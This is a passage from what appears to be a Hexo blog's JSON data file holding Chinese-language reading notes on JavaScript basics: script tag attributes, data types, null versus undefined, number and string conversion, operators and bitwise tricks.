start=\"3\">\n<li>字符串不可变，改变一个字符串值，就是销毁重建一个，IE6-效率很低</li>\n<li>除了null和undefined，其他数据类型都有toString()方法，数值的toString方法有参数，2、8、10、16，表示转成什么进制表示的字符串<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 2;</span><br><span class=\"line\">console.log(num.toString(2)); //&apos;10&apos;</span><br><span class=\"line\">console.log(NaN.toString()); //&apos;NaN&apos;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>但是不能写作：<code>2.toString(2)</code>，会报错</p>\n<ol start=\"5\">\n<li>比toString()更包容的String(), 也可以把null和undefined转换为字符串，<code>String(null)=&quot;null&quot;; String(070)=&quot;56&quot;; String(0x1f)=&quot;31&quot;</code></li>\n<li>转换为字符串还有一种方法：<code>var b = 1+&quot;&quot;; var a = null + &quot;&quot;;</code></li>\n</ol>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript2\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript2</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^1:<a href=\"http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html\" target=\"_blank\" rel=\"noopener\">undefined与null的区别</a></p>\n","site":{"data":{}},"excerpt":"<p>摘要：</p>\n<ol>\n<li><code>&lt;script&gt;</code>的属性defer、async、src、type</li>\n<li>MINE类型、load事件、DOMContentLoaded事件</li>\n<li>文档模式</li>\n<li>报错”Identifier Expected”是因为标识符命名使用了关键字</li>\n<li>用var定义变量和省略var造成的影响</li>\n<li>5种基本数据类型，一种复杂数据类型，使用typeof分别返回什么值</li>\n<li>null和undefined的区别和联系，各自的使用场景，二者相等(==)，分别使用Number()和parseInt/parseFloat得到的值</li>\n<li>typeof可以使用未定义变量而不报错</li>\n<li>会转换为false的五个值</li>\n<li>NaN的两个特性，isNaN函数判断是不是可以转换为数字</li>\n<li>使用时一般用Number方法转换除string外的值，parseInt/parseFloat只能解析string值</li>\n<li>parseInt/parseFloat解析字符串规则是，第一位非空格值必须是数字，否则结果就是NaN</li>\n<li>使用parseInt最好指明进制，parseInt(‘070’,10)</li>\n<li>parseFloat只能解析十进制</li>\n<li>string字符字面量、转义序列，\\ntrbf,<code>\\\\</code> ,\\”,\\’,\\xnn,\\unnnn</li>\n<li>string的length对双字节字符不准</li>\n<li>null和undefined没有toString()方法，所有类型都有String()方法</li>\n<li>number类型的toString()方法，可以传参，2、8、10、16，代表进制</li>\n</ol>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript2\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript2</a></p>\n</blockquote>\n<h1 id=\"一、使用Javascript\"><a href=\"#一、使用Javascript\" class=\"headerlink\" title=\"一、使用Javascript\"></a>一、使用Javascript</h1><h2 id=\"1-使用Javascript的两种方式\"><a href=\"#1-使用Javascript的两种方式\" class=\"headerlink\" title=\"1.使用Javascript的两种方式\"></a>1.使用Javascript的两种方式</h2><p>使用<code>&lt;script&gt;</code>内嵌或者引入外部脚本文件，不能既内嵌又引入，例如这样：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;xxx.js&quot;&gt;</span><br><span class=\"line\">console.log(&apos;js&apos;);</span><br><span class=\"line\">&lt;/script</span><br></pre></td></tr></table></figure></p>\n<p>此时浏览器不解析内嵌的JS代码，只解析引入的代码。<br>最佳实践是使用外部文件，而非嵌入，优点有：易维护、可缓存（同一个文件可以多除引用）、适应未来</p>\n<h2 id=\"2-lt-script-gt-标签的常用属性有：src-defer-async-type\"><a href=\"#2-lt-script-gt-标签的常用属性有：src-defer-async-type\" class=\"headerlink\" title=\"2.&lt;script&gt;标签的常用属性有：src, defer, async,type\"></a>2.<code>&lt;script&gt;</code>标签的常用属性有：src, defer, async,type</h2><ul>\n<li>type, 描述引入文件的MIME类型</li>\n<li>src，有src属性的标签都可以跨域，这样的标签有<code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>,<code>&lt;iframe&gt;</code></li>\n<li>defer, 只能在外部脚本文件上使用，表示延迟到文档完全被解析和显示后再加载，照HTML5规定，会在DOMContentLoaded事件触发前执行(浏览器实现不一定会在此之前执行)，即遇到<code>&lt;/html&gt;</code>标签在执行，用法：<code>&lt;script defer scr=&quot;xx.js&quot;&gt;&lt;/script&gt;</code></li>\n<li>async，HTML5定义的属性，只能在外部脚本文件上使用，表示开始执行JS脚本，但是不阻塞后面脚本的执行。标记为async的多个<code>&lt;script&gt;</code>标签，并不一定按照前后顺序执行。async脚本一定会在load事件之前执行，但可能会在DOMContentLoaded事件触发之前或之后执行</li>\n</ul>\n<p>把<code>&lt;script&gt;</code>引入文件放在body标签的最后，防止阻塞页面展现</p>\n<p><strong>MIME：</strong>定义数据格式，前面是数据的大类型，后面是具体类型，如text/html、img/gif等<br><strong>load事件：</strong>在页面中的一切都加载完毕时触发，包括JS脚本、CSS、图片等<br><strong>DOMContentLoaded事件：</strong>DOM节点树映射完成时触发，高程P408</p>\n<h2 id=\"3-文档模式\"><a href=\"#3-文档模式\" class=\"headerlink\" title=\"3.文档模式\"></a>3.文档模式</h2><p>通过DOCTYPE区分文档模式，分为混杂模式、标准模式和准标准模式，混杂模式会让IE表现出与IE5相同的行为，如果不加DOCTYPE会让浏览器按混杂模式解析。标准模式和准标准模式有很小的差别，<strong>标准模式</strong>(不探讨XHTML)：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML 4.01 严格型 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class=\"line\">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- HTML 5 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br></pre></td></tr></table></figure></p>\n<p><strong>准标准模式</strong>：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML 4.01 过渡型 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC</span><br><span class=\"line\">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span><br><span class=\"line\">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- HTML 4.01 框架集型 --&gt;</span><br><span class=\"line\">&lt;!DOCTYPE HTML PUBLIC</span><br><span class=\"line\">&quot;-//W3C//DTD HTML 4.01 Frameset//EN&quot;</span><br><span class=\"line\">&quot;http://www.w3.org/TR/html4/frameset.dtd&quot;&gt;</span><br></pre></td></tr></table></figure></p>\n<p>现在一般使用html5的DOCTYPE声明</p>\n<h1 id=\"二、基本概念\"><a href=\"#二、基本概念\" class=\"headerlink\" title=\"二、基本概念\"></a>二、基本概念</h1><ol>\n<li>JS中的一切都 <strong>区分大小写</strong></li>\n<li>标识符的第一位可以是字母、下划线、美元符$: aa、 _a、 $a；还可以是中文，但是不推荐</li>\n<li>严格模式<code>use strict</code>，IE10+</li>\n<li>关键字和保留字都不能做标识符，关键字做，会报错 <strong>“Identifier Expected”</strong></li>\n<li>JS中的变量是松散类型的，也就是可以保存任何类型，<strong>变量只是一个占位符</strong></li>\n<li><strong>用var定义的变量，会成为所在作用域的局部变量</strong>，与外界无关，当函数运行完毕，会被销毁<img src=\"http://o798x2hdw.bkt.clouddn.com/var.png\" alt=\"var\"></li>\n<li><strong>在函数中省略var，会创建一个全局变量</strong>，非常不建议这样做，因为在局部作用域定义的全局变量很难维护</li>\n</ol>\n<h1 id=\"三、数据类型\"><a href=\"#三、数据类型\" class=\"headerlink\" title=\"三、数据类型\"></a>三、数据类型</h1><p>这一部分在if else控制流程时很重要的。</p>\n<p>JS中共6种数据类型，5种基本(简单)数据类型：Null、Undefined、String、Number、Boolean<br>1种复杂数据类型：Object</p>\n<h2 id=\"3-1检测数据类型使用typeof\"><a href=\"#3-1检测数据类型使用typeof\" class=\"headerlink\" title=\"3.1检测数据类型使用typeof\"></a>3.1检测数据类型使用typeof</h2><p>对应的可以检测出来的值有：还是六种类型，null会被检测为”object”, function不是一种数据类型，但是会被检测为”function”<br>|  数据类型 | typeof 检测值 |<br>|———–|—————|<br>| null      | “object”      |<br>| undefined | “undefined”   |<br>| string    | “string”      |<br>| number    | “number”      |<br>| boolean   | “boolean”     |<br>| object    | “object” / “function” |<br>例外:正则表达式，在Safari 5和Chrome 7前版本浏览器中，typeof值为”function”，新版本为”object”</p>\n<h2 id=\"3-2-null与undefined区别\"><a href=\"#3-2-null与undefined区别\" class=\"headerlink\" title=\"3.2 null与undefined区别\"></a>3.2 null与undefined区别</h2><h3 id=\"1-undefined\"><a href=\"#1-undefined\" class=\"headerlink\" title=\"1. undefined\"></a>1. undefined</h3><ol>\n<li>定义：已经定义但没有赋值，即没有初始化的变量 <code>var a; // a === undefined</code></li>\n<li>没必要显式赋值，变量未初始化时默认是undefined</li>\n<li><p>使用场景：</p>\n<ul>\n<li><code>var a</code>定义变量而不初始化，默认值为undefined</li>\n<li><code>if (a=== undefined)</code>流程控制时做判断条件</li>\n<li>对象属性没有赋值，默认值为<code>undefined</code>^1<br><code>var a={bb:&quot;xx&quot;}; console.log(a.aa);</code></li>\n<li><p>函数不显式定义返回值，默认返回<code>undefined</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function aa()&#123;</span><br><span class=\"line\">    var a=1;</span><br><span class=\"line\">    a++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">console.log(aa()); // undefined</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>调用函数时，该提供的参数没有提供，参数值默认为<code>undefined</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function aa(bb)&#123;</span><br><span class=\"line\">           console.log(bb);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       aa();</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"2-null\"><a href=\"#2-null\" class=\"headerlink\" title=\"2.null\"></a>2.null</h3><ol>\n<li>定义: 空对象指针</li>\n<li>应该显式赋值  初始化一个未来保存object变量时，初始化为null</li>\n<li>使用场景：</li>\n</ol>\n<ul>\n<li>作为对象初始化的值<code>var timer = null;</code></li>\n<li>作为函数的参数，表示该函数的参数不是对象（这一条的用法不是很理解，谁知道吗？告诉我一下）</li>\n<li>null不是对象，但是是对象原型链的终点<code>Object.prototype.__proto__； // null</code>而null没有prototype；</li>\n<li><code>var dom = document.getElementById(&#39;domId&#39;);</code>如果domId不存在，dom变量为null</li>\n</ul>\n<h3 id=\"3-其他\"><a href=\"#3-其他\" class=\"headerlink\" title=\"3. 其他\"></a>3. 其他</h3><ol>\n<li>undefined 值是派生自 null 值的，所以<code>null == undefined；//true</code>但是<code>null === undefined //false</code></li>\n<li><code>Number(undefined) = NaN; Number(null) = 0</code>，但是使用parseInt和parseFloat都是NaN</li>\n<li><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var aa;</span><br><span class=\"line\">console.log(aa); //undefined</span><br><span class=\"line\">console.log(bb); // 报错</span><br><span class=\"line\">console.log(typeof bb) //undefined</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"3-3-Number类型\"><a href=\"#3-3-Number类型\" class=\"headerlink\" title=\"3.3 Number类型\"></a>3.3 Number类型</h2><ol>\n<li>Boolean()函数，作为if条件，都会自动转换为Boolean值，转换为false的值：null、undefined、””、0和NaN、</li>\n<li>八进制在严格模式下失效，会报错，十六进制以’0x’开头</li>\n<li><code>1.</code>和<code>1.0</code>都会被解析成1，浮点数计算不准，不能作为判断条件例如0.1+0.2并不等于0.3</li>\n<li>科学计数法3.123e7</li>\n<li><code>Number.MIN_VALUE&gt;0</code>是最接近0的正数，isFinite(Number.MAX_VALUE)，Infinity也是一个number</li>\n<li><code>typeof -Infinity //&#39;number&#39;</code></li>\n</ol>\n<h3 id=\"1-NaN\"><a href=\"#1-NaN\" class=\"headerlink\" title=\"1.NaN\"></a>1.NaN</h3><ol>\n<li>NaN，即非数值（Not a Number）是一个特殊的数值，这个数值用于表示一个本来要返回数值的操作数未返回数值的情况（这样就不会抛出错误了）。</li>\n<li><code>0/0 = NaN; 1/0 = Infinity; -1/0 = -Infinity</code></li>\n<li>NaN的两个特性：</li>\n</ol>\n<ul>\n<li>任何涉及NaN的计算，结果都是NaN</li>\n<li>NaN与谁都不相等，<code>NaN==NaN;//false</code></li>\n</ul>\n<ol start=\"4\">\n<li>isNaN() </li>\n</ol>\n<ul>\n<li>可以转化为数值的返回false，包括：null（转化为0），boolean，number类型（不含NaN）,””,”10”;</li>\n<li>不可以转化为数值的返回true，包括：undefined，NaN，Object，”10aa”</li>\n</ul>\n<h3 id=\"2-数值转换Number、parseFloat、parseInt\"><a href=\"#2-数值转换Number、parseFloat、parseInt\" class=\"headerlink\" title=\"2. 数值转换Number、parseFloat、parseInt\"></a>2. 数值转换Number、parseFloat、parseInt</h3><p>三种方法:</p>\n<ol>\n<li>Nubmer()适用于各种数据类型，但是字符串转换规则比较复杂，所以 <strong>Number一般用来转换除字符串的其他类型</strong></li>\n<li><strong>parseFloat和parseInt专门用于字符串转数值</strong>，转换非字符串类型时，都返回NaN<br>3.parseInt转换字符串的规则是:<strong>查看字符串第一位非空格值，如果是数字或者负号，结果就是数值，否则就是NaN</strong>，所以<code>parseInt(&quot;&quot;) = NaN</code></li>\n</ol>\n<ul>\n<li>parseInt(‘22.5’)=22,因为小数点不是有效数字字符</li>\n<li><p>第一个字符是数字，那么可以识别以0开头后跟数字的八进制和0x开头后跟数字的16进制：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt(&apos;070&apos;)=70; </span><br><span class=\"line\">parseInt(&apos;070&apos;,8) = 56; </span><br><span class=\"line\">parseInt(&apos;0x11&apos;) = 17; </span><br><span class=\"line\">parseInt(&apos;1f&apos;) = 1; </span><br><span class=\"line\">parseInt(&apos;1f&apos;,16)=31</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>建议<code>parseInt</code>无论在什么情况下都明确指定基数</strong>:<code>parseInt(&#39;070&#39;,10)</code></p>\n</li>\n</ul>\n<ol start=\"4\">\n<li>parseFloat也是从首个非空格字符开始解析，直到第二个小数点，后面的都忽略，与parseIn的区别：</li>\n</ol>\n<ul>\n<li>首个小数点有效，但是小数点后都是0，将解析为整数</li>\n<li>只能解析十进制，首位0都忽略</li>\n</ul>\n<h2 id=\"3-4-String\"><a href=\"#3-4-String\" class=\"headerlink\" title=\"3.4 String\"></a>3.4 String</h2><ol>\n<li>字符字面量，又叫转义序列: <code>\\ntbrf, \\\\, \\&#39;, \\&quot;,  \\xnn, \\unnnn</code></li>\n</ol>\n<ul>\n<li>‘\\xnn’以16进制代码表示一个字符，”\\x41” 输出结果为”A”</li>\n<li>‘\\unnnn’16进制代码表示一个unicode字符，为unicode码，’\\u7530’输出结果为汉字”田”</li>\n</ul>\n<ol start=\"2\">\n<li>string的length属性，在计算包含双字节字符时可能会不准，</li>\n</ol>\n<ul>\n<li>字节知识：最小单位为bit比特/位，8bit = 1byte 字节，英文字母单字节8bit，汉字双字节16bit</li>\n</ul>\n<ol start=\"3\">\n<li>字符串不可变，改变一个字符串值，就是销毁重建一个，IE6-效率很低</li>\n<li>除了null和undefined，其他数据类型都有toString()方法，数值的toString方法有参数，2、8、10、16，表示转成什么进制表示的字符串<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var num = 2;</span><br><span class=\"line\">console.log(num.toString(2)); //&apos;10&apos;</span><br><span class=\"line\">console.log(NaN.toString()); //&apos;NaN&apos;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>但是不能写作：<code>2.toString(2)</code>，会报错</p>\n<ol start=\"5\">\n<li>比toString()更包容的String(), 也可以把null和undefined转换为字符串，<code>String(null)=&quot;null&quot;; String(070)=&quot;56&quot;; String(0x1f)=&quot;31&quot;</code></li>\n<li>转换为字符串还有一种方法：<code>var b = 1+&quot;&quot;; var a = null + &quot;&quot;;</code></li>\n</ol>\n<hr>\n<blockquote>\n<p>本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 <a href=\"mailto:miao.hnlk@gmail.com\" target=\"_blank\" rel=\"noopener\">miao.hnlk@gmail.com</a><br>本文地址：<a href=\"http://luckymona.github.io/2016/09/17/read-book-professional-javascript2\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com/2016/09/17/read-book-professional-javascript2</a></p>\n</blockquote>\n<p>Reference：</p>\n<p>^1:<a href=\"http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html\" target=\"_blank\" rel=\"noopener\">undefined与null的区别</a></p>"},{"title":"Javascript基础3","date":"2016-09-17T08:00:00.000Z","toc":true,"comments":1,"_content":"摘要：\n\n1. 一切对象都继承自Object，但不包括宿主对象，如DOM对象、BOM对象，宿主环境定义宿主对象\n2. 所有对象都有的方法有：constructor、isPrototypeOf、hasOwnProperty、toString; valueOf、toLocalString、propertyIsEnumberable\n3. 对象使用toString()一般得到\"[object Object]\"\n4. 除null和undefined的数据类型可以使用操作符；\n5. Object类型使用操作符时会先使用toString或者valueOf转换为字符串，如果需要的是数值，再使用Number转换成数值，之后进行操作\n6. ++i与i++的区别：i值改变，与所在语句求值，这两个顺序的不同\n7. 加性操作、乘性操作中，涉及NaN、0、Infinity的特殊状况\n8. 逻辑与&&或||，短路操作，当有一个值是对象时，结果怎样，当有一个值null、undefined、NaN时，结果怎样\n9. 位操作~ & | ^ << >> >>>非与或，异或，左移，有符号右移，无符号右移\n10. 位操作常用场景：~与indexOf配合、求整、判奇偶、判正负、随机颜色\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript3](http://luckymona.github.io/2016/09/17/read-book-professional-javascript3)\n\n\n## 3.5 Object ##\n\n1. 对象就是一组数据和功能的组合；\n2. Object类型是所有对象的祖先，但不是宿主对象的祖先，例如宿主环境浏览器中的BOM和DOM对象是由宿主实现和定义的\n3. 除了宿主对象，其他对象全都拥有有这些方法：\n```\nvar o = new Object; //不传参时，可以不用圆括号，但不推荐这种写法\nconsole.log(); //打印以下值：\n\no.constructor();\no.hasOwnProperty(propertyName);\no.isPrototypeOf(object);\n\no.toString();       // 返回[object NativeConstructorName]，可以用于对象类型检测\no.toLocalString();  // 基础功能类似toString，返回的字符串与执行环境的地理地区对应，可用于Date对象，输出以当地时间格式表示的字符串\no.valueOf();        //\n\n\no.propertyIsEnumberable(propertyName); //不常用\n```\n4. 对Object使用toString()方法，通常会得到'[object Object]'，也可以这样用：\n```\nvar o = { toString: function(){\n        return -1;\n    }\n}\nconsole.log(o.toString()); //-1\n```\n\n## 3.6 操作符 ##\n包括：算数操作符、位操作符、关系操作符、相等操作符，这些操作符均可以应用于除null和undefined之外的数据类型，操作符应用于Object时，会先调用toString()或valueOf()转换成字符串，以取得可以操作的值\n\n1. 使用+、-操作时会先转换数据类型，`1+ \"\" = \"1\"; 1-\"\" = 1;`\n2. ++i和i++的区别在于，所在语句求值之前改变i，还是在语句求值之后，--i和i--同理：\n```\nvar i=0;\nconsole.log(i++) // 0 \n\nvar i= 0;\nconsole.log(++i); // 1\n\nvar j = 20;\nvar res = j++ + 1; // res = 21\n\nvar m = 20;\nvar res = ++m +1 // res = 22\n\n```\n\n3. 逻辑与&&\n有一个操作数不是布尔值的时候：\n对象：\n\n- 第一个值为对象，返回第二个值\n- 第二个值为对象，第一个值计算结果为true时返回第二个数\n- 两个值都是对象，返回第二个值\n\n其他特殊：\n\n- 有一个为NaN、undefined、null，则结果分别为NaN、undefined、null，这三个值相互&&，则返回第一个值：\n```\nNaN && undefined;  // NaN\nundefined && NaN;  // undefined\nnull && NaN;       // null\nNaN && null;       //NaN\n```\n\n逻辑与是短路操作，如果第一个值为false，就不对第二个值求值\n\n4. 逻辑或 ||\n有一个操作数不是布尔值时：\n对象：\n\n- 第一个值为对象，返回第一个值\n- 第二个值为对象，如果第一个值为false，返回第二个值\n- 两值都为对象，返回第一个\n\n其他特殊：\n\n- 两个值都是null、undefined、NaN，那么分别返回null、undefined、NaN\n- null、undefined、NaN之间相互或||运算，返回第二个值\n```\nNaN || null; // null\nnull || NaN; // NaN\n```\n\n5. 乘性操作符\n乘*、除/、取余%，如果操作数不是数值，会先用 **Number()**转换成数值\n乘法特殊点的：\n\n- Infinity * 0 = NaN\n- Infinity乘以非0，是Infinity或者-Infinity\n\n除法特殊点的：\n\n- Infinity / Infinity = NaN\n- 0 / 0 = NaN\n取余特殊的太多，不记了\n\n6. 加性操作符\n\n- Infinity+ (-Infinity) = NaN\n- -Infinity - (-Infinity) = NaN\n- Infinity - Infinity = NaN\n\n7. 比较操作符>、<、==\n\n- NaN与任何值进行比较大小，结果都是false：\n```\nNaN > \"a\"; //false\nNaN <= \"a\"; //false\n```\n\n相等操作符:\n\n- null 和undefined\n```\nnull == undefined； // true\nnull == 0;          // false\nundefined == 0;     // false\n```\n\n- NaN与任何值比较相等，都是false，比较不等都是true：\n```\nNaN == null // false\nNaN != null // true\nNaN != NaN  // true\n```\n\n- 如果两个都是对象，如果这两个指向同一个对象，返回true，否则false\n\n\n## 3.7 位操作 ##\n\n### 3.7.1 位操作基础知识 ###\n1. JS的数字都使用64位格式存储，所以一个数字是4Byte，此外一个英文字母是1Byte，一个汉字是2Byte，基本数据类型变量8Byte\n2. 机器层面是64位，使用JS实际操作时，按照32位操作，有符号整数，左起第一位是符号位，其余为数值位，无符号整数，32位都是数值位，因此数值更大\n3. 负数存储使用二进制补码，求二进制补码的过程：\n\n- 求这个数绝对值的二进制码\n- 求二进制码的反码(0变1,1变0)\n- 将反码加一\n4. 负数的二进制补码形式只在机器存储层面表现，使用toString()输出二进制字符串时，对于负数，得到的只是绝对值二进制码前面加符号\n5. 机器层面把64位存储转换成32位，JS操作完再把32位转成64位存储，这个过程导致副作用是：对NaN和Infinity应用位操作时，都被当成0处理\n6. **位操作都只对整数有效，如果是小数，先舍弃小数，再进行位操作运算**\n\n### 3.7.2 位操作运算 ###\n\n#### 1位操作符列表 ####\n| 操作符 |        英文名         |   中文名   |          用法          |\n|--------|-----------------------|------------|------------------------|\n| ~      | NOT                   | 按位非     | `~i = -(i+1)`，求反码值 |\n| &      | AND                   | 按位与     | `var res = 3 & 7`      |\n| ^      | XOR                   | 按位异或   | `var res = 25 ^ 3`      |\n| <<     | LEFT SHIFT            | 左移       | `var res = 2 << 5`       |\n| >>     | RIGHT SHIFT           | 有符号右移 | `var res = 64 >> 5`      |\n| >>>    | ZERO-FILL RIGHT SHIFT | 无符号右移 | `var res = 64 >>> 5`     |\n\n按位或的符号与MD表格冲突，列在表格外：\n`|`   OR    按位或    `var res = 3 | 7`  \n\n#### 2位操作符应用场景^2^3^4： ####\n列举常用的比较简单的使用场景，尽量少用，会使阅读者理解困难，主要是当别人装13时，自己不至于蒙圈\n\n1. ~-1 = 0，配合利用arr.indexOf(xxx) = -1代表arr中不存在xxx\n```\nvar arr = ['aa', 'bb'] ;\nif(~arr.indexOf(xxx)) {}  // 相当于if(0)，即if(arr中不存在xxx)\n```\n2. 求整，相当于Math.floor：\n```\nvar num1 = ~~1.1; // 1 \nvar num2 = ~~1.9; // 1 \nvar num3 = 1.9|0; // 1\n```\n3. & 判断奇偶：\n```\nfunction isOdd(n){\n    return n & 1?true:false;\n}\nisOdd(3); // true\nisOdd(4); // false\n```\n4. <<和>>2的幂运算\n```\nfunction power(n){\n    return 1 << n; // 求2的n次方\n}\npower(5); //32\n\nconsole.log(32>>1); //求32的一半\n```\n5. `>>>`判断数的正负\n```\nfunction isPos(n){\n   return n === (n>>>0) ? true:false;\n}\nisPos(-1); // false\nisPos(1); // true\n```\n-1>>>0虽然没有向右移动位数，但-1的二进制码已经变成了正数的二进制码：\n所以-1>>>0的值为4294967295。\n6. 或者随机颜色色值，其实用到位运算的就是一个取整，使用Math.floor是一样的\n`'#'+(Math.random()*0xFFFFFF|0).toString(16)`\n\n\n\n---\n> 本文为原创文章，尊重辛勤劳动，可以免费摘要、推荐或聚合，但完整转载需经过本人同意，本人邮箱 miao.hnlk@gmail.com\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript3](http://luckymona.github.io/2016/09/17/read-book-professional-javascript3)\n\nReference：\n\n^2:[js中位运算的运用](http://www.tuicool.com/articles/VJryYb)\n^3:[JS中位操作符有什么特殊作用](http://www.kqiqi.com/knowledge/program/1079.html)\n^4:[小代码大学问之JavaScript位运算](http://www.mmfei.com/?p=299)\n\n\n\n\n","source":"_posts/read-book-professional-javascript3.md","raw":"---\ntitle: Javascript基础3\ndate: 2016-09-17 16:00:00\ncategories: Javascript\ntags: [Javascript,红皮书,读书笔记] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n摘要：\n\n1. 一切对象都继承自Object，但不包括宿主对象，如DOM对象、BOM对象，宿主环境定义宿主对象\n2. 所有对象都有的方法有：constructor、isPrototypeOf、hasOwnProperty、toString; valueOf、toLocalString、propertyIsEnumberable\n3. 对象使用toString()一般得到\"[object Object]\"\n4. 除null和undefined的数据类型可以使用操作符；\n5. Object类型使用操作符时会先使用toString或者valueOf转换为字符串，如果需要的是数值，再使用Number转换成数值，之后进行操作\n6. ++i与i++的区别：i值改变，与所在语句求值，这两个顺序的不同\n7. 加性操作、乘性操作中，涉及NaN、0、Infinity的特殊状况\n8. 逻辑与&&或||，短路操作，当有一个值是对象时，结果怎样，当有一个值null、undefined、NaN时，结果怎样\n9. 位操作~ & | ^ << >> >>>非与或，异或，左移，有符号右移，无符号右移\n10. 位操作常用场景：~与indexOf配合、求整、判奇偶、判正负、随机颜色\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[http://supermaryy.com/2016/09/17/read-book-professional-javascript3](http://luckymona.github.io/2016/09/17/read-book-professional-javascript3)\n\n\n## 3.5 Object ##\n\n1. 对象就是一组数据和功能的组合；\n2. Object类型是所有对象的祖先，但不是宿主对象的祖先，例如宿主环境浏览器中的BOM和DOM对象是由宿主实现和定义的\n3. 除了宿主对象，其他对象全都拥有有这些方法：\n```\nvar o = new Object; //不传参时，可以不用圆括号，但不推荐这种写法\nconsole.log(); //打印以下值：\n\no.constructor();\no.hasOwnProperty(propertyName);\no.isPrototypeOf(object);\n\no.toString();       // 返回[object NativeConstructorName]，可以用于对象类型检测\no.toLocalString();  // 基础功能类似toString，返回的字符串与执行环境的地理地区对应，可用于Date对象，输出以当地时间格式表示的字符串\no.valueOf();        //\n\n\no.propertyIsEnumberable(propertyName); //不常用\n```\n4. 对Object使用toString()方法，通常会得到'[object Object]'，也可以这样用：\n```\nvar o = { toString: function(){\n        return -1;\n    }\n}\nconsole.log(o.toString()); //-1\n```\n\n## 3.6 操作符 ##\n包括：算数操作符、位操作符、关系操作符、相等操作符，这些操作符均可以应用于除null和undefined之外的数据类型，操作符应用于Object时，会先调用toString()或valueOf()转换成字符串，以取得可以操作的值\n\n1. 使用+、-操作时会先转换数据类型，`1+ \"\" = \"1\"; 1-\"\" = 1;`\n2. ++i和i++的区别在于，所在语句求值之前改变i，还是在语句求值之后，--i和i--同理：\n```\nvar i=0;\nconsole.log(i++) // 0 \n\nvar i= 0;\nconsole.log(++i); // 1\n\nvar j = 20;\nvar res = j++ + 1; // res = 21\n\nvar m = 